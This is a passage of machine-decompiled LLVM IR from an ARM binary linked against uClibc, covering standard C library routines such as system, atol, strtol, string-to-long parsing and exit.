  %v2_deb4 = icmp ugt i32 %arg2, 62
  %v7_deb4 = icmp eq i32 %arg2, 63
  %v2_deb8 = xor i1 %v7_deb4, true
  %v3_deb8 = and i1 %v2_deb4, %v2_deb8
  br i1 %v3_deb8, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_deb4
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_deb4, %bb22
  %v1_dec46 = phi i32 [ %v3_de7c, %dec_label_pc_deb4 ], [ 2, %bb22 ]
  %v2_debc = xor i1 %v2_deb4, true
  %v3_debc = or i1 %v7_deb4, %v2_debc
  br i1 %v3_debc, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
  %v1_decc = phi i32 [ 3, %bb21 ], [ %v1_dec47, %bb20 ], [ %v1_dec46, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_14328.594 to i32), i32* %r2.global-to-local, align 4
  %v4_dec4 = mul i32 %v1_decc, 4
  %v5_dec4 = add i32 %v4_dec4, ptrtoint (i32* @global_var_14328.594 to i32)
  store i32 %v5_dec4, i32* %r3.global-to-local, align 4
  %v1_dec8 = add i32 %v4_dec4, add (i32 ptrtoint (i32* @global_var_14328.594 to i32), i32 20)
  %v2_dec8 = inttoptr i32 %v1_dec8 to i32*
  %v3_dec8 = load i32, i32* %v2_dec8, align 4
  store i32 %v3_dec8, i32* %r1.global-to-local, align 4
  %v6_decc = inttoptr i32 %v5_dec4 to i32*
  %v7_decc = load i32, i32* %v6_decc, align 4
  store i32 %v7_decc, i32* %r2.global-to-local, align 4
  %v1_ded0 = add i32 %tmp, 4
  store i32 %v1_ded0, i32* @r6, align 4
  %v4_ded4 = mul i32 %v3_dec8, 4
  %v5_ded4 = add i32 %v4_ded4, %v1_ded0
  store i32 %v5_ded4, i32* %r3.global-to-local, align 4
  %v2_ded8 = add i32 %arg3, 24
  %v3_ded8 = inttoptr i32 %v2_ded8 to i32*
  store i32 %v5_ded4, i32* %v3_ded8, align 4
  %v0_dedc = load i32, i32* %r2.global-to-local, align 4
  %v1_dedc = load i32, i32* @r5, align 4
  %v2_dedc = add i32 %v1_dedc, 20
  %v3_dedc = inttoptr i32 %v2_dedc to i32*
  store i32 %v0_dedc, i32* %v3_dedc, align 4
  %v0_dee0 = load i32, i32* %r1.global-to-local, align 4
  %v1_dee0 = load i32, i32* @r5, align 4
  %v2_dee0 = add i32 %v1_dee0, 16
  %v3_dee0 = inttoptr i32 %v2_dee0 to i32*
  store i32 %v0_dee0, i32* %v3_dee0, align 4
  %v0_dee4 = load i32, i32* @r4, align 4
  %v1_dee4 = load i32, i32* @r5, align 4
  %v2_dee4 = add i32 %v1_dee4, 12
  %v3_dee4 = inttoptr i32 %v2_dee4 to i32*
  store i32 %v0_dee4, i32* %v3_dee4, align 4
  %v0_dee8 = load i32, i32* @r6, align 4
  %v1_dee8 = load i32, i32* @r5, align 4
  %v2_dee8 = add i32 %v1_dee8, 8
  %v3_dee8 = inttoptr i32 %v2_dee8 to i32*
  store i32 %v0_dee8, i32* %v3_dee8, align 4
  %v0_deec = load i32, i32* @r5, align 4
  store i32 %v0_deec, i32* %r1.global-to-local, align 4
  %v0_def0 = load i32, i32* @r0, align 4
  %v2_def0 = inttoptr i32 %v0_def0 to i32*
  %v3_def0 = call i32 @srandom_r(i32* %v2_def0, i32 %v0_deec)
  store i32 %v3_def0, i32* %r0.global-to-local, align 4
  %v0_def4 = load i32, i32* @r4, align 4
  %v2_def4 = icmp eq i32 %v0_def4, 0
  br i1 %v2_def4, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_df1012 = load i32, i32* @r7, align 4
  %v2_df1013 = inttoptr i32 %v1_df1012 to i32*
  store i32 0, i32* %v2_df1013, align 4
  %v1_df14 = load i32, i32* @r4, align 4
  store i32 %v1_df14, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_def8 = load i32, i32* @r5, align 4
  %v2_def8 = add i32 %v1_def8, 4
  %v3_def8 = inttoptr i32 %v2_def8 to i32*
  %v4_def8 = load i32, i32* %v3_def8, align 4
  %v1_defc = load i32, i32* @r6, align 4
  %v3_defc = sub i32 %v4_def8, %v1_defc
  %v4_df00 = sdiv i32 %v3_defc, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_df08 = mul i32 %v4_df00, 5
  %v5_df08 = add i32 %v4_df08, %v0_def4
  store i32 %v5_df08, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_df10 = load i32, i32* @r7, align 4
  %v2_df10 = inttoptr i32 %v1_df10 to i32*
  store i32 0, i32* %v2_df10, align 4
  %v1_df18 = load i32, i32* %r3.global-to-local, align 4
  %v2_df18 = load i32, i32* @r7, align 4
  %v3_df18 = inttoptr i32 %v2_df18 to i32*
  store i32 %v1_df18, i32* %v3_df18, align 4
  %v17_df1c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_df1c = phi i32 [ %v1_df14, %bb26 ], [ %v17_df1c.pre, %.thread4 ]
  %v2_df1c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_df1c, i32* %r4.global-to-local, align 4
  ret i32 %v17_df1c

dec_label_pc_df20:                                ; preds = %dec_label_pc_dea4
  %v0_df20 = call i32 @__errno_location()
  store i32 %v0_df20, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_df28 = inttoptr i32 %v0_df20 to i32*
  store i32 22, i32* %v2_df28, align 4
  %v0_df2c = call i32 @__errno_location()
  %v0_df30 = load i32, i32* %r4.global-to-local, align 4
  %v2_df30 = inttoptr i32 %v0_df2c to i32*
  store i32 %v0_df30, i32* %v2_df30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_df38 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_df38, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_deb4, { 1, 0 }
  uselistorder i1 %v7_de8c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_14328.594 to i32), i32 20), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_14328.594 to i32), { 2, 3, 1, 0 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_df40 = load i32, i32* @r4, align 4
  %v0_df44 = load i32, i32* %r0.global-to-local, align 4
  %v2_df44 = icmp eq i32 %v0_df44, 0
  br i1 %v2_df44, label %bb, label %dec_label_pc_df58

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e064

dec_label_pc_df58:                                ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_df60 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_df70 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_df80 = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_df80, i32* %r0.global-to-local, align 4
  %v1_df88 = call i32 @__vfork(i32 %v2_df80)
  store i32 %v1_df88, i32* %r0.global-to-local, align 4
  store i32 %v1_df88, i32* @r4, align 4
  %v1_df8c = icmp slt i32 %v1_df88, 0
  br i1 %v1_df8c, label %dec_label_pc_df94, label %dec_label_pc_dfc0

dec_label_pc_df94:                                ; preds = %dec_label_pc_df58
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_df9c = call i32 @__bsd_signal(i32 3, i32 %v2_df60)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_dfa8 = call i32 @__bsd_signal(i32 2, i32 %v2_df70)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_dfb4 = call i32 @__bsd_signal(i32 17, i32 %v2_df80)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e064

dec_label_pc_dfc0:                                ; preds = %dec_label_pc_df58
  %v2_df8c = icmp eq i32 %v1_df88, 0
  br i1 %v2_df8c, label %dec_label_pc_dfc4, label %dec_label_pc_e008

dec_label_pc_dfc4:                                ; preds = %dec_label_pc_dfc0
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_dfcc = call i32 @__bsd_signal(i32 3, i32 0)
  %v0_dfd0 = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_dfd8 = call i32 @__bsd_signal(i32 2, i32 %v0_dfd0)
  %v0_dfdc = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_dfe4 = call i32 @__bsd_signal(i32 17, i32 %v0_dfdc)
  store i32 ptrtoint ([8 x i8]* @global_var_14350.602 to i32), i32* @r0, align 4
  %v0_dff8 = load i32, i32* @r4, align 4
  %v8_dffc = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_14350.602 to i32), i32 ptrtoint ([3 x i8]* @global_var_14358.604 to i32), i32 ptrtoint ([3 x i8]* @global_var_1435c.606 to i32), i32 %v0_df44, i32 %v0_dff8)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_e004 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_e008:                                ; preds = %dec_label_pc_dfc0
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_e010 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_e01c = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_e02c = load i32, i32* @r4, align 4
  store i32 %v0_e02c, i32* %r0.global-to-local, align 4
  %v0_e030 = call i32 @wait4()
  store i32 %v0_e030, i32* %r0.global-to-local, align 4
  %v7_e034 = icmp eq i32 %v0_e030, -1
  br i1 %v7_e034, label %bb10, label %bb11

bb10:                                             ; preds = %dec_label_pc_e008
  store i32 %v0_e030, i32* %stack_var_-12, align 4
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_e008, %bb10
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_e044 = call i32 @__bsd_signal(i32 3, i32 %v2_df60)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_e050 = call i32 @__bsd_signal(i32 2, i32 %v2_df70)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_e05c = call i32 @__bsd_signal(i32 17, i32 %v2_df80)
  %v3_e060 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_e060, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e064

dec_label_pc_e064:                                ; preds = %bb, %dec_label_pc_df94, %bb11
  %v8_e068 = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_df94 ], [ %v3_e060, %bb11 ]
  store i32 %v3_df40, i32* @r4, align 4
  ret i32 %v8_e068

; uselistorder directives
  uselistorder i32 %v0_e030, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 20, 19, 21, 22, 23, 0, 1 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e064, { 2, 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_e080 = call i32 @strtol()
  ret i32 %v0_e080
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_e088 = call i32 @_stdlib_strto_l()
  ret i32 %v0_e088
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_e08c = load i32, i32* @r4, align 4
  store i32 %v3_e08c, i32* %stack_var_-36, align 4
  %v0_e090 = load i32, i32* @r1, align 4
  store i32 %v0_e090, i32* %sb.global-to-local, align 4
  %v0_e094 = load i32, i32* @r2, align 4
  store i32 %v0_e094, i32* %r5.global-to-local, align 4
  %v0_e098 = load i32, i32* @r3, align 4
  store i32 %v0_e098, i32* %fp.global-to-local, align 4
  %v0_e09c = load i32, i32* @r0, align 4
  %v2_e0b0.pre = load i32, i32* @global_var_1d7a4, align 4
  br label %dec_label_pc_e0a8

dec_label_pc_e0a8:                                ; preds = %dec_label_pc_e0a8, %entry
  %v0_e0e0 = phi i32 [ %v0_e09c, %entry ], [ %v1_e0a4, %dec_label_pc_e0a8 ]
  store i32 %v0_e0e0, i32* %r4.global-to-local, align 4
  %v1_e0ac = inttoptr i32 %v0_e0e0 to i8*
  %v2_e0ac = load i8, i8* %v1_e0ac, align 1
  %v3_e0ac = zext i8 %v2_e0ac to i32
  %v3_e0b4 = mul nuw nsw i32 %v3_e0ac, 2
  %v4_e0b4 = add i32 %v3_e0b4, %v2_e0b0.pre
  %v5_e0b4 = inttoptr i32 %v4_e0b4 to i8*
  %v6_e0b4 = load i8, i8* %v5_e0b4, align 1
  %v1_e0b8 = and i8 %v6_e0b4, 32
  %v2_e0b8 = icmp eq i8 %v1_e0b8, 0
  %v1_e0a4 = add i32 %v0_e0e0, 1
  br i1 %v2_e0b8, label %dec_label_pc_e0c0, label %dec_label_pc_e0a8

dec_label_pc_e0c0:                                ; preds = %dec_label_pc_e0a8
  %v7_e0c0 = icmp eq i8 %v2_e0ac, 43
  br i1 %v7_e0c0, label %dec_label_pc_e0e0, label %dec_label_pc_e0c8

dec_label_pc_e0c8:                                ; preds = %dec_label_pc_e0c0
  %v7_e0c8 = icmp eq i8 %v2_e0ac, 45
  br i1 %v7_e0c8, label %dec_label_pc_e0e0, label %bb

bb:                                               ; preds = %dec_label_pc_e0c8
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e0e4

dec_label_pc_e0e0:                                ; preds = %dec_label_pc_e0c0, %dec_label_pc_e0c8
  %storemerge43 = phi i32 [ 1, %dec_label_pc_e0c8 ], [ 0, %dec_label_pc_e0c0 ]
  store i32 %storemerge43, i32* %r7.global-to-local, align 4
  store i32 %v1_e0a4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e0e4

dec_label_pc_e0e4:                                ; preds = %bb, %dec_label_pc_e0e0
  %v0_e104 = phi i32 [ %v0_e0e0, %bb ], [ %v1_e0a4, %dec_label_pc_e0e0 ]
  %v1_e0e4 = and i32 %v0_e094, -17
  %v3_e0e4 = icmp eq i32 %v1_e0e4, 0
  br i1 %v3_e0e4, label %dec_label_pc_e0f0, label %bb54

bb54:                                             ; preds = %dec_label_pc_e0e4
  br label %bb58

dec_label_pc_e0f0:                                ; preds = %dec_label_pc_e0e4
  %v1_e0f0 = inttoptr i32 %v0_e104 to i8*
  %v2_e0f0 = load i8, i8* %v1_e0f0, align 1
  %v7_e0f4 = icmp eq i8 %v2_e0f0, 48
  %v1_e0f8 = add i32 %v0_e094, 10
  store i32 %v1_e0f8, i32* %r5.global-to-local, align 4
  br i1 %v7_e0f4, label %dec_label_pc_e104, label %bb55

bb55:                                             ; preds = %dec_label_pc_e0f0
  br label %.thread8

dec_label_pc_e104:                                ; preds = %dec_label_pc_e0f0
  %v1_e104 = add i32 %v0_e104, 1
  %v2_e104 = inttoptr i32 %v1_e104 to i8*
  %v3_e104 = load i8, i8* %v2_e104, align 1
  %v4_e104 = zext i8 %v3_e104 to i32
  store i32 %v1_e104, i32* %r4.global-to-local, align 4
  %v1_e108 = or i32 %v4_e104, 32
  %v7_e10c = icmp eq i32 %v1_e108, 120
  %v1_e110 = add i32 %v0_e094, 8
  store i32 %v1_e110, i32* %r5.global-to-local, align 4
  br i1 %v7_e10c, label %bb56, label %.thread8

bb56:                                             ; preds = %dec_label_pc_e104
  %v3_e11c = mul i32 %v1_e110, 2
  store i32 %v3_e11c, i32* %r5.global-to-local, align 4
  %v2_e120 = add i32 %v0_e104, 2
  store i32 %v2_e120, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_e104, %bb55, %bb56
  %v1_e1e428 = phi i32 [ %v0_e09c, %bb55 ], [ %v1_e104, %bb56 ], [ %v1_e104, %dec_label_pc_e104 ]
  %v0_e16c19 = phi i32 [ %v0_e104, %bb55 ], [ %v2_e120, %bb56 ], [ %v1_e104, %dec_label_pc_e104 ]
  %v0_e124 = phi i32 [ %v1_e0f8, %bb55 ], [ %v3_e11c, %bb56 ], [ %v1_e110, %dec_label_pc_e104 ]
  %v5_e128 = icmp slt i32 %v0_e124, 16
  br i1 %v5_e128, label %bb58, label %bb57

bb57:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %bb54, %.thread8, %bb57
  %v1_e1e427 = phi i32 [ %v0_e09c, %bb54 ], [ %v1_e1e428, %.thread8 ], [ %v1_e1e428, %bb57 ]
  %v0_e16c18 = phi i32 [ %v0_e104, %bb54 ], [ %v0_e16c19, %.thread8 ], [ %v0_e16c19, %bb57 ]
  %v0_e13c = phi i32 [ %v0_e094, %bb54 ], [ %v0_e124, %.thread8 ], [ 16, %bb57 ]
  %v1_e12c = add i32 %v0_e13c, -2
  %tmp = icmp ugt i32 %v1_e12c, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_e13c

.thread:                                          ; preds = %bb58
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_e1e0

dec_label_pc_e13c:                                ; preds = %bb58
  %v2_e144 = urem i32 -1, %v0_e13c
  %v1_e154 = urem i32 %v2_e144, 256
  store i32 %v1_e154, i32* %sl.global-to-local, align 4
  %v2_e158 = udiv i32 -1, %v0_e13c
  store i32 0, i32* @ip, align 4
  store i32 %v2_e158, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_e16c

dec_label_pc_e168:                                ; preds = %bb65, %dec_label_pc_e1c8
  %v0_e168 = phi i32 [ %v1_e198, %bb65 ], [ %v0_e168.pre, %dec_label_pc_e1c8 ]
  br label %dec_label_pc_e16c

dec_label_pc_e16c:                                ; preds = %dec_label_pc_e13c, %dec_label_pc_e168
  %v1_e1e425 = phi i32 [ %v1_e1e427, %dec_label_pc_e13c ], [ %v0_e168, %dec_label_pc_e168 ]
  %v0_e198 = phi i32 [ %v0_e16c18, %dec_label_pc_e13c ], [ %v0_e168, %dec_label_pc_e168 ]
  %v1_e16c = inttoptr i32 %v0_e198 to i8*
  %v2_e16c = load i8, i8* %v1_e16c, align 1
  %v3_e16c = zext i8 %v2_e16c to i32
  %v1_e170 = add nsw i32 %v3_e16c, -48
  %v1_e174 = urem i32 %v1_e170, 256
  %v1_e17c = or i32 %v3_e16c, 32
  %tmp73 = icmp ult i32 %v1_e174, 10
  br i1 %tmp73, label %bb60, label %dec_label_pc_e184

dec_label_pc_e184:                                ; preds = %dec_label_pc_e16c
  %tmp74 = icmp ugt i32 %v1_e17c, 96
  br i1 %tmp74, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_e184
  %v1_e188 = add nsw i32 %v1_e17c, -87
  %v5_e190 = urem i32 %v1_e188, 256
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_e16c, %dec_label_pc_e184, %bb59
  %v3_e1c0 = phi i32 [ %v1_e174, %dec_label_pc_e16c ], [ 40, %dec_label_pc_e184 ], [ %v5_e190, %bb59 ]
  %v1_e194 = load i32, i32* %r5.global-to-local, align 4
  %v1_e198 = add i32 %v0_e198, 1
  store i32 %v1_e198, i32* %r4.global-to-local, align 4
  %v6_e19c = icmp slt i32 %v3_e1c0, %v1_e194
  br i1 %v6_e19c, label %dec_label_pc_e1a0, label %dec_label_pc_e1e0.loopexit

dec_label_pc_e1a0:                                ; preds = %bb60
  %v0_e1a0 = load i32, i32* @ip, align 4
  %v1_e1a0 = load i32, i32* %r8.global-to-local, align 4
  %v9_e1a0 = icmp eq i32 %v0_e1a0, %v1_e1a0
  br i1 %v9_e1a0, label %.thread37, label %bb61

.thread37:                                        ; preds = %dec_label_pc_e1a0
  br label %dec_label_pc_e1b0

bb61:                                             ; preds = %dec_label_pc_e1a0
  %v3_e1a0 = icmp ult i32 %v0_e1a0, %v1_e1a0
  br i1 %v3_e1a0, label %dec_label_pc_e1b0, label %dec_label_pc_e1c8

dec_label_pc_e1b0:                                ; preds = %bb61, %.thread37
  %v4_e1b82240 = phi i32 [ 1, %.thread37 ], [ 0, %bb61 ]
  %v1_e1b0 = load i32, i32* %sl.global-to-local, align 4
  %v3_e1b0 = icmp uge i32 %v3_e1c0, %v1_e1b0
  %v9_e1b0 = icmp eq i32 %v3_e1c0, %v1_e1b0
  %v2_e1b4 = xor i1 %v3_e1b0, true
  %v3_e1b4 = or i1 %v9_e1b0, %v2_e1b4
  br i1 %v3_e1b4, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_e1b0
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_e1b0, %bb62
  %v4_e1b8 = phi i32 [ %v4_e1b82240, %dec_label_pc_e1b0 ], [ 0, %bb62 ]
  %v2_e1b8 = xor i1 %v9_e1b0, true
  %v3_e1b8 = and i1 %v3_e1b0, %v2_e1b8
  br i1 %v3_e1b8, label %bb64, label %thread-pre-split

bb64:                                             ; preds = %bb63
  %v5_e1b8 = urem i32 %v4_e1b8, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb63, %bb64
  %v0_e1bc = phi i32 [ %v5_e1b8, %bb64 ], [ %v4_e1b8, %bb63 ]
  %v2_e1bc = icmp eq i32 %v0_e1bc, 0
  br i1 %v2_e1bc, label %bb65, label %dec_label_pc_e1c8

bb65:                                             ; preds = %thread-pre-split
  %v4_e1c0 = mul i32 %v0_e1a0, %v1_e194
  %v5_e1c0 = add i32 %v4_e1c0, %v3_e1c0
  store i32 %v5_e1c0, i32* @ip, align 4
  br label %dec_label_pc_e168

dec_label_pc_e1c8:                                ; preds = %bb61, %thread-pre-split
  %v0_e1c8 = call i32 @__errno_location()
  %v0_e1cc = load i32, i32* %r7.global-to-local, align 4
  %v1_e1cc = load i32, i32* %fp.global-to-local, align 4
  %v2_e1cc = and i32 %v1_e1cc, %v0_e1cc
  store i32 %v2_e1cc, i32* %r7.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v2_e1d8 = inttoptr i32 %v0_e1c8 to i32*
  store i32 34, i32* %v2_e1d8, align 4
  %v0_e168.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e168

dec_label_pc_e1e0.loopexit:                       ; preds = %bb60
  %v0_e1e0.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e1e0

dec_label_pc_e1e0:                                ; preds = %.thread, %dec_label_pc_e1e0.loopexit
  %v1_e1e4 = phi i32 [ %v1_e1e425, %dec_label_pc_e1e0.loopexit ], [ %v1_e1e427, %.thread ]
  %v2_e1e4 = phi i32 [ %v0_e1e0.pre, %dec_label_pc_e1e0.loopexit ], [ %v0_e090, %.thread ]
  %v2_e1e0 = icmp eq i32 %v2_e1e4, 0
  br i1 %v2_e1e0, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_e1e0
  %v3_e1e4 = inttoptr i32 %v2_e1e4 to i32*
  store i32 %v1_e1e4, i32* %v3_e1e4, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_e1e0, %bb66
  %v0_e1e8 = load i32, i32* %r7.global-to-local, align 4
  %v2_e1e8 = icmp eq i32 %v0_e1e8, 0
  %. = select i1 %v2_e1e8, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_e1f4 = load i32, i32* %fp.global-to-local, align 4
  %v2_e1f4 = icmp eq i32 %v0_e1f4, 0
  %v0_e218.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_e1f4, label %dec_label_pc_e210, label %bb70

bb70:                                             ; preds = %bb67
  %tmp75 = icmp ugt i32 %v0_e218.pre.pre, %.
  br i1 %tmp75, label %dec_label_pc_e200, label %dec_label_pc_e210

dec_label_pc_e200:                                ; preds = %bb70
  %v0_e200 = call i32 @__errno_location()
  %v2_e208 = inttoptr i32 %v0_e200 to i32*
  store i32 34, i32* %v2_e208, align 4
  %v0_e20c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e20c, i32* @ip, align 4
  %v0_e210.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e210

dec_label_pc_e210:                                ; preds = %bb70, %bb67, %dec_label_pc_e200
  %v0_e218.pre = phi i32 [ %v0_e218.pre.pre, %bb70 ], [ %v0_e20c, %dec_label_pc_e200 ], [ %v0_e218.pre.pre, %bb67 ]
  %v0_e210 = phi i32 [ %v0_e1e8, %bb70 ], [ %v0_e210.pre, %dec_label_pc_e200 ], [ %v0_e1e8, %bb67 ]
  %v2_e210 = icmp eq i32 %v0_e210, 0
  br i1 %v2_e210, label %dec_label_pc_e210._crit_edge, label %bb71

bb71:                                             ; preds = %dec_label_pc_e210
  %v2_e214 = sub i32 0, %v0_e218.pre
  store i32 %v2_e214, i32* @ip, align 4
  br label %dec_label_pc_e210._crit_edge

dec_label_pc_e210._crit_edge:                     ; preds = %dec_label_pc_e210, %bb71
  %v0_e218 = phi i32 [ %v2_e214, %bb71 ], [ %v0_e218.pre, %dec_label_pc_e210 ]
  %v2_e21c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_e21c, i32* @r4, align 4
  ret i32 %v0_e218

; uselistorder directives
  uselistorder i32 %v0_e218.pre, { 1, 0 }
  uselistorder i32 %v0_e218.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_e1b8, { 1, 0 }
  uselistorder i1 %v3_e1b0, { 1, 0 }
  uselistorder i32 %v1_e1b0, { 1, 0 }
  uselistorder i32 %v1_e198, { 1, 0 }
  uselistorder i32 %v1_e17c, { 1, 0 }
  uselistorder i32 %v1_e174, { 1, 0 }
  uselistorder i32 %v0_e168, { 1, 0 }
  uselistorder i32 %v0_e13c, { 1, 0, 2 }
  uselistorder i32 %v3_e11c, { 1, 0 }
  uselistorder i32 %v1_e110, { 1, 0, 2 }
  uselistorder i32 %v0_e104, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_e0a4, { 1, 0, 2 }
  uselistorder i32 %v0_e09c, { 1, 0, 2 }
  uselistorder i32 %v0_e094, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder label %dec_label_pc_e210._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_e210, { 2, 0, 1 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_e1e0, { 1, 0 }
  uselistorder label %dec_label_pc_e1c8, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e16c, { 1, 0 }
  uselistorder label %dec_label_pc_e168, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e0e4, { 1, 0 }
  uselistorder label %dec_label_pc_e0e0, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_e224 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_e224, i32* @r0, align 4
  %v1_e240 = call i32 @__pthread_return_void()
  %v1_e250 = call i32 @__pthread_return_0()
  %v2_e258 = load i32, i32* @global_var_1fe0c.614, align 4
  %v2_e25c = icmp eq i32 %v2_e258, 0
  br i1 %v2_e25c, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_e258)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_e224, i32* @r0, align 4
  %v1_e27c = call i32 @__pthread_return_void()
  store i32 %v1_e27c, i32* @r0, align 4
  %v1_e280 = call i32 @__GI___uClibc_fini(i32 %v1_e27c)
  store i32 ptrtoint (i32* @global_var_b2d8.617 to i32), i32* @r3, align 4
  store i32 58004, i32* @lr, align 4
  %v2_e290 = call i32 @_stdio_term()
  %v0_e294 = load i32, i32* @r4, align 4
  %v1_e298 = call i32 @__GI__exit(i32 %v0_e294)
  unreachable

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
